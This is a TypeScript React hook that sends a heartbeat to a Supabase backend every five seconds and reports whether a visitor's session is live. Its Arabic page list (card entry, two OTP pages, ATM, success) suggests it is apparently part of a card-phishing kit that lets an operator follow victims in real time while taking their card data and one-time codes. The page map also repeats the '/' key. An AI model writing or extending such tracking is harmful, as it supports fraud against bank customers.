// Heartbeat tracking hook - sends ping every 5 seconds to track user activity
import { useEffect, useRef, useCallback } from "react";
import { ensureSessionId } from "./submissions";

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL ?? "";
const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY ?? "";
const PING_INTERVAL_MS = 5000; // 5 seconds

// Page names mapping for better readability
export const PAGE_NAMES: Record<string, string> = {
  "/": "الرئيسية",
  "/card": "إدخال البطاقة",
  "/otp": "الرمز",
  "/otp2": "الرمز 2",
  "/atm": "الصراف",
  "/success": "نجاح",
  "/": "تسجيل البيانات",
};

export function getPageName(path: string): string {
  return PAGE_NAMES[path] || path;
}

interface PingData {
  session_id: string;
  current_page: string;
  last_ping: string;
}

async function sendPing(sessionId: string, currentPage: string): Promise<void> {
  if (!supabaseUrl || !supabaseKey) {
    console.log("❌ Supabase not configured, skipping ping");
    return;
  }

  try {
    const response = await fetch(`${supabaseUrl}/rest/v1/pings`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'apikey': supabaseKey,
        'Authorization': `Bearer ${supabaseKey}`,
        'Prefer': 'return=representation'
      },
      body: JSON.stringify({
        session_id: sessionId,
        current_page: currentPage,
        last_ping: new Date().toISOString(),
      }),
    });

    if (!response.ok) {
      console.warn("Failed to send ping:", response.status);
    }
  } catch (error) {
    console.error("Ping error:", error);
  }
}

// Get latest ping for a session from Supabase
export async function getLatestPing(sessionId: string): Promise<PingData | null> {
  if (!supabaseUrl || !supabaseKey) return null;

  try {
    const response = await fetch(
      `${supabaseUrl}/rest/v1/pings?session_id=eq.${sessionId}&order=last_ping.desc&limit=1`,
      {
        headers: {
          'apikey': supabaseKey,
          'Authorization': `Bearer ${supabaseKey}`,
        },
      }
    );

    if (!response.ok) return null;

    const data = await response.json();
    if (data && data.length > 0) {
      return {
        session_id: data[0].session_id,
        current_page: data[0].current_page,
        last_ping: data[0].last_ping,
      };
    }
  } catch (error) {
    console.error("Failed to get latest ping:", error);
  }

  return null;
}

// Hook to track user activity with heartbeat
export function useHeartbeatTracking(currentPage: string = "/") {
  const intervalRef = useRef<number | null>(null);
  const sessionIdRef = useRef<string>("");

  const startTracking = useCallback(() => {
    if (intervalRef.current) return;

    sessionIdRef.current = ensureSessionId();
    
    // Send initial ping
    void sendPing(sessionIdRef.current, currentPage);

    // Set up interval for continuous pings
    intervalRef.current = window.setInterval(() => {
      void sendPing(sessionIdRef.current, currentPage);
    }, PING_INTERVAL_MS);
  }, [currentPage]);

  const stopTracking = useCallback(() => {
    if (intervalRef.current) {
      window.clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
  }, []);

  const updatePage = useCallback((newPage: string) => {
    if (sessionIdRef.current) {
      void sendPing(sessionIdRef.current, newPage);
    }
  }, []);

  useEffect(() => {
    startTracking();
    return () => stopTracking();
  }, [startTracking, stopTracking]);

  // Update page tracking when it changes
  useEffect(() => {
    updatePage(currentPage);
  }, [currentPage, updatePage]);

  return {
    sessionId: sessionIdRef.current,
    updatePage,
    stopTracking,
  };
}

// Format time for display
export function formatLiveTime(isoString: string): string {
  const diff = Date.now() - new Date(isoString).getTime();
  const secs = Math.floor(diff / 1000);
  
  if (secs < 60) {
    return `منذ ${secs} ثانية`;
  }
  
  const mins = Math.floor(secs / 60);
  const remainingSecs = secs % 60;
  
  if (mins < 60) {
    return `منذ ${mins} دقيقة و ${remainingSecs} ثانية`;
  }
  
  const hours = Math.floor(mins / 60);
  const remainingMins = mins % 60;
  
  if (hours < 24) {
    return `منذ ${hours} ساعة و ${remainingMins} دقيقة`;
  }
  
  // Fallback to date format
  return new Date(isoString).toLocaleString("ar-EG", {
    day: "numeric",
    month: "short",
    hour: "2-digit",
    minute: "2-digit",
  });
}

// Check if session is active (within 10 seconds)
export function isSessionActive(lastPing: string | null): boolean {
  if (!lastPing) return false;
  const diff = Date.now() - new Date(lastPing).getTime();
  return diff <= 10000; // 10 seconds
}

// Get time since last ping in seconds
export function getSecondsSincePing(lastPing: string | null): number {
  if (!lastPing) return Infinity;
  return Math.floor((Date.now() - new Date(lastPing).getTime()) / 1000);
}